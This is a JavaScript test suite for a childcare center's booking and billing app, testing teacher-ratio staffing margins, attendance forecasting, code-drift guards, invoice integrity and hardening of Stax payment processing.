        expect(r.releasableHours).toBe(10);  // 2 teachers x 5 h
    });
    test('an all-full-day room releases nobody at midday', () => {
        const r = _rsRun([_rsRoom()], _RS_WAGE, _rsFill(8, 0))[0];
        expect(r.pmChildren).toBe(8);
        expect(r.releasable).toBe(0);
        expect(r.releasableHours).toBe(0);
    });
    test('headroom is tracked per shift', () => {
        const r = _rsRun([_rsRoom()], _RS_WAGE, _rsFill(10, 7))[0];
        expect(r.headroomAm).toBe(2);        // 3 teachers cover 12
        expect(r.headroomPm).toBe(1);        // 1 teacher covers 4
    });
    test('when the morning is the tight shift, the full day is the better sale', () => {
        // 8 children, 3 half → AM 8 (headroom 0), PM 5 (headroom 3)
        const r = _rsRun([_rsRoom()], _RS_WAGE, _rsFill(8, 3))[0];
        expect(r.headroomAm).toBe(0);
        expect(r.headroomPm).toBe(3);
        // Both trip the same morning teacher and nothing else, so the labor is
        // identical either way — take the higher rate.
        expect(r.fullDay.cost).toBe(100);
        expect(r.halfDay.cost).toBe(100);
        expect(r.fullDay.margin).toBe(-25);  // 75 - 100
        expect(r.halfDay.margin).toBe(-55);  // 45 - 100
    });
    test('both shifts on the boundary costs a full-day child a teacher all day', () => {
        // 8 children, 4 half → AM 8 (headroom 0), PM 4 (headroom 0)
        const r = _rsRun([_rsRoom()], _RS_WAGE, _rsFill(8, 4))[0];
        expect(r.headroomAm).toBe(0);
        expect(r.headroomPm).toBe(0);
        expect(r.fullDay.cost).toBe(200);    // both shifts
        expect(r.fullDay.margin).toBe(-125);
        expect(r.halfDay.cost).toBe(100);    // morning only
        expect(r.halfDay.margin).toBe(-55);
    });
    test('a slack morning with a tight afternoon makes the half day free', () => {
        // 6 children, 2 half → AM 6 (headroom 2), PM 4 (headroom 0)
        const r = _rsRun([_rsRoom()], _RS_WAGE, _rsFill(6, 2))[0];
        expect(r.headroomAm).toBe(2);
        expect(r.headroomPm).toBe(0);
        expect(r.halfDay.verdict).toBe('free');
        expect(r.halfDay.margin).toBe(45);
        expect(r.fullDay.verdict).toBe('step');
        expect(r.fullDay.margin).toBe(-25);  // 75 - 100 for the afternoon teacher
    });
    test('a full-day-only room offers no half day', () => {
        const r = _rsRun([_rsRoom({ fullDayOnly: true, halfDayRate: null })],
            _RS_WAGE, _rsFill(4))[0];
        expect(r.halfDay.verdict).toBe('not-offered');
        expect(r.halfRate).toBe(0);
    });
    test('a room with no half-day rate offers no half day', () => {
        const r = _rsRun([_rsRoom({ halfDayRate: 0 })], _RS_WAGE, _rsFill(4))[0];
        expect(r.halfDay.verdict).toBe('not-offered');
    });
    test('an empty room is a step on both shifts — the first child needs a teacher', () => {
        const r = _rsRun([_rsRoom()], _RS_WAGE, [])[0];
        expect(r.amChildren).toBe(0);
        expect(r.staffAm).toBe(0);
        expect(r.fullDay.verdict).toBe('opens');
        expect(r.fullDay.margin).toBe(-125); // 75 - 200 (both shifts)
        expect(r.halfDay.margin).toBe(-55);  // 45 - 100 (morning only)
    });
    test('a full room reports no sellable seat for either booking type', () => {
        const r = _rsRun([_rsRoom({ capacity: 4 })], _RS_WAGE, _rsFill(4))[0];
        expect(r.openSeats).toBe(0);
        expect(r.fullDay.verdict).toBe('full');
        expect(r.halfDay.verdict).toBe('full');
    });
    test('an overbooked room is still full, not sellable', () => {
        const r = _rsRun([_rsRoom({ capacity: 3 })], _RS_WAGE, _rsFill(4))[0];
        expect(r.openSeats).toBe(-1);
        expect(r.fullDay.verdict).toBe('full');
    });
    test('open seats are counted against the morning, when the room is fullest', () => {
        const r = _rsRun([_rsRoom({ capacity: 10 })], _RS_WAGE, _rsFill(10, 7))[0];
        expect(r.openSeats).toBe(0);         // not 7, despite the empty afternoon
    });
    test('an unset ratio leaves every shift figure unknown', () => {
        const r = _rsRun([_rsRoom({ staffRatio: 0 })], _RS_WAGE, _rsFill(4))[0];
        expect(r.staffAm).toBeNull();
        expect(r.headroomAm).toBeNull();
        expect(r.releasable).toBeNull();
        expect(r.fullDay.verdict).toBe('no-ratio');
    });
    test('waitlisted bookings are excluded from the count', () => {
        const r = _rsRun([_rsRoom()], _RS_WAGE, [{ room: 'a' }, { room: 'a', wl: true }])[0];
        expect(r.amChildren).toBe(1);
    });
    test('unconfirmed registrations are excluded from the count', () => {
        const r = _rsRun([_rsRoom()], _RS_WAGE, [{ room: 'a' }, { room: 'a', status: 'pending' }])[0];
        expect(r.amChildren).toBe(1);
    });
    test('per-date room override wins over the registration room', () => {
        allRegistrations = [{ status: 'confirmed', room_id: 'b', registration_dates: [
            { care_date: '2026-08-11', room_id: 'a', day_type: 'full', waitlisted: false }] }];
        const r = _buildRatioStepRows(['2026-08-11'], [_rsRoom()], _RS_WAGE)[0];
        expect(r.amChildren).toBe(1);
    });
    test('emits one row per room per day', () => {
        const rows = _rsRun([_rsRoom(), _rsRoom({ id: 'b', label: 'B' })], _RS_WAGE,
            _rsFill(2), ['2026-08-11', '2026-08-12']);
        expect(rows.length).toBe(4);
    });
    test('bookings outside the requested week are ignored', () => {
        const r = _rsRun([_rsRoom()], _RS_WAGE,
            [{ room: 'a' }, { room: 'a', date: '2026-09-01' }])[0];
        expect(r.amChildren).toBe(1);
    });
    test('real case — Bear Room, 6 full-day children at 1:3, one from a 3rd teacher', () => {
        const bear = _rsRoom({ id: 'bear', staffRatio: 3, capacity: 9,
                               fullDayRate: 80, fullDayOnly: true, halfDayRate: null });
        const r = _rsRun([bear], [{ pay_type: 'hourly', hourly_rate: 16.83, room_id: 'bear' }],
            _rsFill(6, 0, 'bear'))[0];
        expect(r.staffAm).toBe(2);
        expect(r.staffPm).toBe(2);           // no half-days, so no midday relief
        expect(r.releasable).toBe(0);
        expect(r.headroomAm).toBe(0);
        expect(r.openSeats).toBe(3);         // seats look available...
        expect(r.fullDay.verdict).toBe('step');
        expect(r.fullDay.margin).toBeCloseTo(-88.3, 1);   // 80 - 168.30, both shifts
    });
    test('real case — Goose Room, 10 children with 7 half-day, frees 2 afternoon teachers', () => {
        const goose = _rsRoom({ id: 'goose', staffRatio: 8, capacity: 15,
                                fullDayRate: 75, halfDayRate: 45 });
        const r = _rsRun([goose], [{ pay_type: 'hourly', hourly_rate: 16.83, room_id: 'goose' }],
            _rsFill(10, 7, 'goose'))[0];
        expect(r.amChildren).toBe(10);
        expect(r.pmChildren).toBe(3);
        expect(r.staffAm).toBe(2);
        expect(r.staffPm).toBe(1);
        expect(r.releasableHours).toBe(5);   // one teacher can leave at midday
        expect(r.fullDay.verdict).toBe('free');
    });
});

// ── Demand forecast (copied from js/admin/admin-reports.js) ──
// Projects bookings from the same-weekday average, falling back to a moving
// average, and converts to expected attendance via a measured show rate.
const FORECAST_MIN_SAMPLES = 4;

function _forecastMean(values) {
    if (!values || !values.length) return null;
    return values.reduce((sum, v) => sum + v, 0) / values.length;
}

function _forecastShowRate(attendanceRows) {
    let present = 0, marked = 0;
    (attendanceRows || []).forEach(r => {
        if (r.status === 'present')     { present++; marked++; }
        else if (r.status === 'absent') { marked++; }
    });
    if (marked === 0) return null;
    return { rate: present / marked, marked };
}

function _forecastConfidence(sampleCount) {
    if (!sampleCount)                          return 'none';
    if (sampleCount < FORECAST_MIN_SAMPLES)    return 'thin';
    return 'good';
}

function _buildForecastRows(opts) {
    const { targetDates, rooms, history, recent, booked, showRate } = opts;
    const rows = [];

    targetDates.forEach(date => {
        const dow = new Date(date + 'T00:00:00').getDay();
        rooms.forEach(room => {
            const h        = history[room.id]?.[dow] || { totals: [], halves: [] };
            const samples  = h.totals.length;
            const weekday  = _forecastMean(h.totals);
            const moving   = _forecastMean(recent[room.id]);
            // Prefer the weekday-specific estimate; fall back to the flat level
            // only when that weekday has never been seen for this room.
            const forecast = weekday !== null ? weekday : moving;

            // Half-day share drives the afternoon, so carry it through rather
            // than assuming the mix holds at the center-wide average.
            const meanHalf  = _forecastMean(h.halves);
            const halfShare = (forecast && meanHalf !== null && weekday)
                ? Math.min(1, meanHalf / weekday)
                : 0;

            const bookedNow  = booked[date]?.[room.id]?.total || 0;
            const expected   = (forecast !== null && showRate) ? forecast * showRate.rate : null;
            // Staff to what we expect to walk in where that is known, else to
            // the booking forecast.
            const basis      = expected !== null ? expected : forecast;
            const amChildren = basis === null ? null : Math.round(basis);
            const pmChildren = amChildren === null ? null : Math.round(basis * (1 - halfShare));
            const staffAm    = amChildren === null ? null : _ratioStaffNeed(amChildren, room.staffRatio || 0);
            const staffPm    = pmChildren === null ? null : _ratioStaffNeed(pmChildren, room.staffRatio || 0);

            rows.push({
                date, dow, roomId: room.id, roomLabel: room.label,
                samples, confidence: _forecastConfidence(samples),
                weekdayAvg: weekday, movingAvg: moving, forecast,
                halfShare, bookedNow, expected,
                amChildren, pmChildren, staffAm, staffPm,
                capacity: room.capacity || 0,
                overCapacity: room.capacity > 0 && amChildren !== null && amChildren > room.capacity,
            });
        });
    });
    return rows;
}

const _fcRoom = (over = {}) =>
    Object.assign({ id: 'a', label: 'A', staffRatio: 4, capacity: 20 }, over);
// history[roomId][dow] = { totals, halves }
const _fcHist = (dow, totals, halves = totals.map(() => 0)) => ({ a: { [dow]: { totals, halves } } });
const _fcRun = (over = {}) => _buildForecastRows(Object.assign({
    targetDates: ['2026-08-13'],           // a Thursday (dow 4)
    rooms: [_fcRoom()],
    history: _fcHist(4, [8, 8, 8, 8]),
    recent: { a: [4, 4] },
    booked: {},
    showRate: null,
}, over))[0];

describe('_forecastMean — an absent estimate is not zero', () => {
    test('averages a list', () => { expect(_forecastMean([2, 4])).toBe(3); });
    test('an empty list has no estimate', () => { expect(_forecastMean([])).toBeNull(); });
    test('a missing list has no estimate', () => { expect(_forecastMean(null)).toBeNull(); });
    test('a measured zero is an estimate of zero, not a missing one', () => {
        expect(_forecastMean([0, 0])).toBe(0);
    });
});

describe('_forecastShowRate — measured from marked days only', () => {
    test('no marks means no show rate', () => {
        expect(_forecastShowRate([])).toBeNull();
        expect(_forecastShowRate(null)).toBeNull();
    });
    test('everyone present is a full show rate', () => {
        expect(_forecastShowRate([{ status: 'present' }, { status: 'present' }]).rate).toBe(1);
    });
    test('present over marked, not over booked', () => {
        const r = _forecastShowRate([
            { status: 'present' }, { status: 'present' },
            { status: 'present' }, { status: 'absent' },
        ]);
        expect(r.rate).toBe(0.75);
        expect(r.marked).toBe(4);
    });
    test('unrecognized statuses are ignored rather than counted as absent', () => {
        const r = _forecastShowRate([{ status: 'present' }, { status: 'unknown' }]);
        expect(r.rate).toBe(1);
        expect(r.marked).toBe(1);
    });
    test('all absent is a zero show rate, not a missing one', () => {
        expect(_forecastShowRate([{ status: 'absent' }]).rate).toBe(0);
    });
});

describe('_forecastConfidence — how much history is behind an estimate', () => {
    test('never seen', () => { expect(_forecastConfidence(0)).toBe('none'); });
    test('seen once is thin', () => { expect(_forecastConfidence(1)).toBe('thin'); });
    test('just under the bar is thin', () => { expect(_forecastConfidence(3)).toBe('thin'); });
    test('at the bar is good', () => { expect(_forecastConfidence(4)).toBe('good'); });
});

describe('_buildForecastRows — projecting the weeks ahead', () => {
    test('uses the same-weekday average for that weekday', () => {
        const r = _fcRun();
        expect(r.weekdayAvg).toBe(8);
        expect(r.forecast).toBe(8);
        expect(r.amChildren).toBe(8);
    });
    test('a different weekday does not borrow this one\'s history', () => {
        // history only for Thursday (4); target is a Monday
        const r = _fcRun({ targetDates: ['2026-08-10'] });
        expect(r.weekdayAvg).toBeNull();
        expect(r.forecast).toBe(4);          // falls back to the moving average
    });
    test('falls back to the moving average when the weekday is unseen', () => {
        const r = _fcRun({ history: { a: {} } });
        expect(r.weekdayAvg).toBeNull();
        expect(r.movingAvg).toBe(4);
        expect(r.forecast).toBe(4);
    });
    test('no history at all leaves the projection unknown, not zero', () => {
        const r = _fcRun({ history: { a: {} }, recent: { a: [] } });
        expect(r.forecast).toBeNull();
        expect(r.amChildren).toBeNull();
        expect(r.staffAm).toBeNull();
    });
    test('a show rate converts bookings into expected attendance', () => {
        const r = _fcRun({ showRate: { rate: 0.75, marked: 40 } });
        expect(r.forecast).toBe(8);          // bookings
        expect(r.expected).toBe(6);          // 8 x 0.75
        expect(r.amChildren).toBe(6);        // staffed to who shows up
    });
    test('without a show rate the projection stays at the booking level', () => {
        const r = _fcRun();
        expect(r.expected).toBeNull();
        expect(r.amChildren).toBe(8);
    });
    test('the afternoon drops that weekday\'s half-day share', () => {
        const r = _fcRun({ history: _fcHist(4, [8, 8, 8, 8], [4, 4, 4, 4]) });
        expect(r.halfShare).toBe(0.5);
        expect(r.amChildren).toBe(8);
        expect(r.pmChildren).toBe(4);
    });
    test('staffing follows the ratio on each projected shift', () => {
        const r = _fcRun({ history: _fcHist(4, [8, 8, 8, 8], [4, 4, 4, 4]) });
        expect(r.staffAm).toBe(2);           // ceil(8/4)
        expect(r.staffPm).toBe(1);           // ceil(4/4)
    });
    test('a projection above capacity is flagged', () => {
        const r = _fcRun({ rooms: [_fcRoom({ capacity: 5 })] });
        expect(r.amChildren).toBe(8);
        expect(r.overCapacity).toBe(true);
    });
    test('a projection within capacity is not flagged', () => {
        expect(_fcRun().overCapacity).toBe(false);
    });
    test('bookings already on the books are carried through', () => {
        const r = _fcRun({ booked: { '2026-08-13': { a: { total: 3, half: 1 } } } });
        expect(r.bookedNow).toBe(3);
        expect(r.forecast).toBe(8);          // forecast is independent of them
    });
    test('a date with no bookings yet reports zero booked, not unknown', () => {
        expect(_fcRun().bookedNow).toBe(0);
    });
    test('confidence reflects how many times the weekday was seen', () => {
        expect(_fcRun({ history: _fcHist(4, [8, 8, 8, 8]) }).confidence).toBe('good');
        expect(_fcRun({ history: _fcHist(4, [8, 8]) }).confidence).toBe('thin');
        expect(_fcRun({ history: { a: {} } }).confidence).toBe('none');
    });
    test('emits one row per room per target date', () => {
        const rows = _buildForecastRows({
            targetDates: ['2026-08-13', '2026-08-14'],
            rooms: [_fcRoom(), _fcRoom({ id: 'b', label: 'B' })],
            history: {}, recent: {}, booked: {}, showRate: null,
        });
        expect(rows.length).toBe(4);
    });
    test('a half-day share cannot exceed the whole', () => {
        // more halves than totals would be corrupt input; clamp rather than
        // produce a negative afternoon
        const r = _fcRun({ history: _fcHist(4, [4, 4], [8, 8]) });
        expect(r.halfShare).toBe(1);
        expect(r.pmChildren).toBe(0);
    });
});

describe('source-drift guard — copies must match js/ source', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const selfText = fs.readFileSync(__filename, 'utf8');

    const GUARDED = [
        ['calcAgeMonths',      'js/supabase.js'],
        ['roomIdForAgeMonths', 'js/supabase.js'],
        ['getRoomIdFromDob',   'js/supabase.js'],
        ['effectiveRate',      'js/app.js'],
        ['getWeekMonday',      'js/app.js'],
        ['csvCell',            'js/admin/admin-core.js'],
        ['_ratioStepWage',     'js/admin/admin-reports.js'],
        ['_ratioStaffNeed',    'js/admin/admin-reports.js'],
        ['_ratioStepOffer',    'js/admin/admin-reports.js'],
        ['_buildRatioStepRows','js/admin/admin-reports.js'],
        ['_forecastMean',       'js/admin/admin-reports.js'],
        ['_forecastShowRate',   'js/admin/admin-reports.js'],
        ['_forecastConfidence', 'js/admin/admin-reports.js'],
        ['_buildForecastRows',  'js/admin/admin-reports.js'],
    ];

    for (const [fnName, relPath] of GUARDED) {
        test(`${fnName} matches ${relPath}`, () => {
            const srcText = fs.readFileSync(path.join(repoRoot, relPath), 'utf8');
            const fromSource = extractFunction(srcText, fnName);
            const fromTest   = extractFunction(selfText, fnName);

            if (!fromSource) throw new Error(`${fnName} not found in ${relPath} — was it renamed or removed?`);
            if (!fromTest)   throw new Error(`${fnName} not found in this test file`);

            if (normalize(fromSource) !== normalize(fromTest)) {
                throw new Error(
                    `${fnName} has drifted from ${relPath}.\n` +
                    `      The tests above are therefore testing code that is no longer in production.\n` +
                    `      Re-sync the copy in js/tests/business-logic.test.js with the source.\n` +
                    `      --- ${relPath} ---\n      ${normalize(fromSource)}\n` +
                    `      --- test copy ---\n      ${normalize(fromTest)}`
                );
            }
        });
    }
});

describe('cross-file drift guard — worker.js SSR copies must match js/ source', () => {
    const repoRoot   = path.resolve(__dirname, '..', '..');
    const read       = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    const workerText = read('worker.js');

    // worker.js server-renders the home page's classroom cards so a crawler sees
    // ages/rates/capacity in the HTML instead of an empty <div>. It cannot import
    // from js/ — those files are classic browser scripts with top-level side
    // effects, and the pages load them unbundled in local dev — so it holds
    // copies. These tests are what keep the copies honest.
    const PAIRS = [
        ['escHtml',                 'js/supabase.js'],
        ['getSortedRooms',          'js/supabase.js'],
        ['buildPublicRoomCardsHtml', 'js/app.js'],
    ];

    for (const [fnName, relPath] of PAIRS) {
        test(`worker.js ${fnName} matches ${relPath}`, () => {
            const fromSource = extractFunction(read(relPath), fnName);
            const fromWorker = extractFunction(workerText, fnName);
            if (!fromSource) throw new Error(`${fnName} not found in ${relPath} — renamed or removed?`);
            if (!fromWorker) throw new Error(`${fnName} not found in worker.js — the SSR copy was removed?`);
            if (normalize(fromSource) !== normalize(fromWorker)) {
                throw new Error(
                    `${fnName} has drifted between worker.js and ${relPath}.\n` +
                    `      The server-rendered classroom cards no longer match what the browser renders,\n` +
                    `      so Google would index different markup than a visitor sees.\n` +
                    `      --- ${relPath} ---\n      ${normalize(fromSource)}\n` +
                    `      --- worker.js ---\n      ${normalize(fromWorker)}`
                );
            }
        });
    }

    // Pull an array/object literal out of a source file and evaluate it. These
    // are plain data literals with no identifier references, so there is nothing
    // to resolve — but compare VALUES rather than text, because worker.js keeps
    // its copy on one line per room and js/supabase.js spreads it over twelve.
    function extractLiteral(sourceText, name, openCh, closeCh) {
        const start = sourceText.search(new RegExp(`^const\\s+${name}\\s*=\\s*\\${openCh}`, 'm'));
        if (start === -1) return null;
        const open = sourceText.indexOf(openCh, start);
        let depth = 0, i = open;
        for (; i < sourceText.length; i++) {
            const c = sourceText[i];
            if (c === openCh) depth++;
            else if (c === closeCh) { depth--; if (depth === 0) { i++; break; } }
        }
        // eslint-disable-next-line no-eval
        return eval(`(${sourceText.slice(open, i)})`);
    }

    test('worker.js ROOM_CAPACITY_NOUNS matches js/app.js', () => {
        const a = extractLiteral(read('js/app.js'), 'ROOM_CAPACITY_NOUNS', '{', '}');
        const b = extractLiteral(workerText,        'ROOM_CAPACITY_NOUNS', '{', '}');
        if (!a || !b) throw new Error('ROOM_CAPACITY_NOUNS not found in one of the two files');
        expect(JSON.stringify(b)).toBe(JSON.stringify(a));
    });

    // Only the fields the server-side renderer actually reads. worker.js
    // deliberately does not carry the rest of the ROOMS shape (seasons, status
    // metadata it never consults), so a whole-object compare would fail for no
    // reason a reader could act on.
    test('worker.js ROOMS matches the SSR-relevant fields of js/supabase.js ROOMS', () => {
        const SSR_FIELDS = ['id', 'label', 'ages', 'ageMinMonths', 'capacity',
                            'fullDayOnly', 'fullDayRate', 'halfDayRate', 'staffRatio'];
        const pick = list => list.map(r => Object.fromEntries(SSR_FIELDS.map(f => [f, r[f] ?? null])));

        const source = extractLiteral(read('js/supabase.js'), 'ROOMS', '[', ']');
        const worker = extractLiteral(workerText,             'ROOMS', '[', ']');
        if (!source || !worker) throw new Error('ROOMS not found in one of the two files');

        const want = JSON.stringify(pick(source), null, 1);
        const got  = JSON.stringify(pick(worker), null, 1);
        if (want !== got) {
            throw new Error(
                'ROOMS has drifted between worker.js and js/supabase.js.\n' +
                '      A room added, renamed or re-priced in js/supabase.js must be mirrored in\n' +
                "      worker.js's SSR copy, or the server-rendered cards will be wrong.\n" +
                `      --- js/supabase.js ---\n      ${want}\n` +
                `      --- worker.js ---\n      ${got}`
            );
        }
    });
});

describe('billing invoice integrity guards', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    const migration = read('supabase/migrations/20260825040000_billing_invoice_integrity.sql');
    const billingUi = read('js/admin/admin-billing.js');
    const billMonth = read('js/admin/admin-bill-month.js');

    test('database calculator constrains care dates to the requested month', () => {
        expect(migration.includes('rd.care_date >= v_month_start')).toBe(true);
        expect(migration.includes('rd.care_date <  v_month_end')).toBe(true);
    });

    test('finalized imports count as issued invoices', () => {
        expect(migration.includes("status IN ('sent', 'finalized', 'paid', 'partial')")).toBe(true);
    });

    test('zero-booking reconciliation removes stale drafts', () => {
        expect(/v_base = 0 AND v_final = 0[\s\S]*?DELETE FROM billing_invoices[\s\S]*?status = 'draft'/.test(migration)).toBe(true);
    });

    test('private reconciler is not executable by browser roles', () => {
        expect(/REVOKE EXECUTE ON FUNCTION public\._reconcile_billing_invoice_internal[\s\S]*?PUBLIC, anon, authenticated/.test(migration)).toBe(true);
    });

    test('normal admin generation no longer writes caller-calculated amounts', () => {
        expect(billingUi.includes('upsertBillingInvoice(')).toBe(false);
        expect(billMonth.includes('upsertBillingInvoice(')).toBe(false);
        expect(billingUi.includes('reconcileBillingInvoice(')).toBe(true);
        expect(billMonth.includes('reconcileBillingInvoice(')).toBe(true);
    });

    test('admin pricing honors per-date room promotions and weekly rates', () => {
        const reports = read('js/admin/admin-reports.js');
        expect(reports.includes('date.room_id || reg.room_id')).toBe(true);
        expect(reports.includes('weeklyFullRate')).toBe(true);
        expect(reports.includes('weeklyHalfRate')).toBe(true);
    });

    test('post-registration invoice failures are durably reported', () => {
        const app = read('js/app.js');
        const monitor = read('js/error-monitor.js');
        expect(app.includes('window.reportClientError?.(')).toBe(true);
        expect(monitor.includes('window.reportClientError = reportError')).toBe(true);
    });
});

describe('Stax payment security guards', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    const migration = read('supabase/migrations/20260827225514_harden_stax_payments.sql');
    const chargeFn = read('supabase/functions/charge-stax-payment/index.ts');
    const webhookFn = read('supabase/functions/stax-webhook/index.ts');

    test('active payment attempts are unique per family, not merely invoice', () => {
        expect(/payment_charge_locks_active_family_idx[\s\S]*?\(family_id\)[\s\S]*?processor_succeeded/.test(migration)).toBe(true);
    });

    test('charge allocation and reversal recording use atomic database functions', () => {
        expect(chargeFn.includes('admin.rpc("stax_finalize_charge"')).toBe(true);
        expect(webhookFn.includes('admin.rpc("stax_record_reversal"')).toBe(true);
        expect(migration.includes('CREATE OR REPLACE FUNCTION public.stax_finalize_charge')).toBe(true);
        expect(migration.includes('CREATE OR REPLACE FUNCTION public.stax_record_reversal')).toBe(true);
    });

    test('privileged Stax database functions are not browser-executable', () => {
        for (const signature of [
            'stax_quote_balance(bigint, uuid)',
            'stax_prepare_charge(bigint, uuid, numeric, text)',
            'stax_set_charge_state(bigint, text, text, text)',
            'stax_finalize_charge(bigint)',
            'stax_record_reversal(text, text, text, numeric)',
        ]) {
            expect(migration.includes(`REVOKE ALL ON FUNCTION public.${signature} FROM PUBLIC, anon, authenticated`)).toBe(true);
        }
    });

    test('webhook re-fetches the transaction from Stax before mutation', () => {
        const verifyAt = webhookFn.indexOf('/transaction/${encodeURIComponent(eventTransactionId)}');
        const mutateAt = webhookFn.indexOf('admin.rpc("stax_record_reversal"');
        expect(verifyAt).toBeGreaterThan(-1);
        expect(mutateAt).toBeGreaterThan(verifyAt);
    });

    test('charge verifies the payment method belongs to the family customer', () => {
        const lookupAt = chargeFn.indexOf('/payment-method/${encodeURIComponent(paymentMethodId)}');
        const reserveAt = chargeFn.indexOf('admin.rpc("stax_prepare_charge"');
        expect(lookupAt).toBeGreaterThan(-1);
        expect(chargeFn.includes('verifiedMethod?.customer_id')).toBe(true);
        expect(reserveAt).toBeGreaterThan(lookupAt);
    });

    test('client never reads a Stax PENDING (HTTP 202) response as a confirmed charge', () => {
        // The edge function returns 202 for PENDING — a 2xx status, so
        // supabase-js resolves it as `data` rather than `error`. Without an
        // explicit check, the caller's generic "!== true" guard discards the
        // real ambiguous/still-processing message the server sent.
        const supabaseJs = read('js/supabase.js');
        const start = supabaseJs.indexOf('async function chargeStaxPayment');
        const end = supabaseJs.indexOf('async function adminRefundPayment');
        expect(start).toBeGreaterThan(-1);
        expect(end).toBeGreaterThan(start);
        const fnBody = supabaseJs.slice(start, end);
        expect(fnBody.includes('data.success !== true')).toBe(true);
        expect(fnBody.includes('data.ambiguous')).toBe(true);
        expect(fnBody.includes("data.error || 'Your payment could not be confirmed.'")).toBe(true);
    });

    test('webhook records only processor-verified successful transactions', () => {
        const successAt = webhookFn.indexOf('const verifiedSuccess = transaction?.success === true');
        const reversalAt = webhookFn.indexOf('admin.rpc("stax_record_reversal"');
        expect(successAt).toBeGreaterThan(-1);
        expect(webhookFn.indexOf('if (!verifiedSuccess)', successAt)).toBeGreaterThan(successAt);
        expect(reversalAt).toBeGreaterThan(successAt);
    });

    test('client request carries the stable server-created payment attempt id', () => {
        const createFn = read('supabase/functions/create-stax-charge/index.ts');
        const client = read('js/supabase.js');
        expect(createFn.includes('paymentAttemptId: crypto.randomUUID()')).toBe(true);
        expect(client.includes('paymentAttemptId: opts?.paymentAttemptId')).toBe(true);
        expect(chargeFn.includes('idempotency_id: paymentAttemptId')).toBe(true);
    });

    test('normal parent Pay online button uses Stax without a test query flag', () => {
        const portal = read('js/portal/portal-billing.js');
        expect(portal.includes('class="pb-pay-btn pb-stax-btn"')).toBe(true);
        expect(portal.includes('pbStaxTestEnabled')).toBe(false);
        expect(portal.includes('with Stax (test)')).toBe(false);
    });

    test('parent Stax endpoints fail closed unless explicitly configured for production', () => {
        const createFn = read('supabase/functions/create-stax-charge/index.ts');
        expect(createFn.includes('STAX_ENVIRONMENT')).toBe(true);
        expect(createFn.includes('!== "production"')).toBe(true);
        expect(chargeFn.includes('STAX_ENVIRONMENT')).toBe(true);
        expect(chargeFn.includes('!== "production"')).toBe(true);
    });

    test('portal falls back to the existing hosted checkout while Stax is gated', () => {
        const portal = read('js/portal/portal-billing.js');
        expect(portal.includes("e?.message === 'Online payments are not configured for production yet.'")).toBe(true);
        expect(portal.includes('return pbStartPayment(invoiceId)')).toBe(true);
    });

    test('saved-card response does not expose the opaque payment method id', () => {
        const createFn = read('supabase/functions/create-stax-charge/index.ts');
        const savedCardBlock = createFn.match(/savedCard:[\s\S]*?\} : null/);
        if (!savedCardBlock) throw new Error('savedCard response block not found');
        expect(savedCardBlock[0].includes('paymentMethodId')).toBe(false);
    });

    test('temporary webhook-admin function is inert and JWT protected in source config', () => {
        const tempFn = read('supabase/functions/stax-webhook-admin-tmp/index.ts');
        const config = read('supabase/config.toml');
        expect(tempFn.includes('status: 410')).toBe(true);
        expect(tempFn.includes('Deno.env')).toBe(false);
        expect(/\[functions\.stax-webhook-admin-tmp\][\s\S]*?verify_jwt\s*=\s*true/.test(config)).toBe(true);
    });

    test('_headers and worker.js ship identical CSP values', () => {
        const headersMatch = read('_headers').match(/^\s*Content-Security-Policy:\s*(.+)$/m);
        if (!headersMatch) throw new Error('CSP missing from _headers');
        const workerMatch = read('worker.js').match(/newHeaders\.set\(\s*'Content-Security-Policy',([\s\S]*?)\n\s*\);/);
        if (!workerMatch) throw new Error('CSP setter missing from worker.js');
        // The captured expression is a concatenation of repository-owned
        // string literals and comments; evaluating it yields the actual header.
        // eslint-disable-next-line no-eval
        const workerCsp = eval(workerMatch[1]);
        expect(workerCsp).toBe(headersMatch[1].trim());
    });

    test('public bundles contain no server-side Stax or Supabase secret names', () => {
        const bundles = read('dist/portal.min.js') + read('dist/supabase.min.js');
        for (const secretName of ['STAX_API_KEY', 'STAX_WEBHOOK_SECRET', 'SUPABASE_SERVICE_ROLE_KEY']) {
            expect(bundles.includes(secretName)).toBe(false);
        }
    });
});

describe('Stax payment reconciliation job', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    const reconcileFn = read('supabase/functions/reconcile-stax-payments/index.ts');

    test('the list endpoint is used only for discovery, never trusted for a decision', () => {
        // Every decision (recover vs. release) must be made from a
        // verifyTransaction() result, not from listCandidateTransactionIds().
        const decisionBlock = reconcileFn.slice(
            reconcileFn.indexOf('let matched: any = null;'),
            reconcileFn.indexOf('await admin.from("admin_audit_log")'),
        );
        expect(decisionBlock.includes('verifyTransaction(')).toBe(true);
        expect(/matched\.(success|status|id)/.test(decisionBlock)).toBe(true);
        // listCandidateTransactionIds' own return value (candidateIds) is only
        // ever iterated to call verifyTransaction — never read for success/status.
        expect(/candidateIds\.(success|status)/.test(decisionBlock)).toBe(false);
    });

    test('recovery reuses the same atomic RPCs the webhook already uses, no new billing logic', () => {
        expect(reconcileFn.includes('admin.rpc("stax_set_charge_state"')).toBe(true);
        expect(reconcileFn.includes('admin.rpc("stax_finalize_charge"')).toBe(true);
    });

    test('a stale lock with no matching Stax transaction is eventually released, not locked out forever', () => {
        expect(reconcileFn.includes("p_status: \"failed\"")).toBe(true);
        expect(reconcileFn.includes('RELEASE_HOURS')).toBe(true);
        expect(reconcileFn.includes('releaseBeforeMs')).toBe(true);
    });

    test('the release-window comparison uses numeric timestamps, not raw string comparison', () => {
        // A DB-returned timestamp string and a JS toISOString() string can
        // format offsets differently ("+00:00" vs "Z"), which breaks a plain
        // string `<` comparison at the boundary. Must compare as epoch ms.
        expect(reconcileFn.includes('new Date(lock.updated_at).getTime() < releaseBeforeMs')).toBe(true);
    });

    test('scheduled via cron, service role key never committed to the migration', () => {
        const schedule = read('supabase/migrations/schedule_stax_reconciliation.sql');
        expect(schedule.includes("cron.schedule(\n  'reconcile-stax-payments'")).toBe(true);
        expect(schedule.includes('{SERVICE_ROLE_KEY}')).toBe(true);
        expect(/sb_secret_|sb_[a-z]+_[A-Za-z0-9_-]{20,}/.test(schedule)).toBe(false);
    });
});

// ---- Summary ----
console.log(`\n  Results: ${_passed} passed, ${_failed} failed\n`);
if (_failed > 0) process.exitCode = 1;
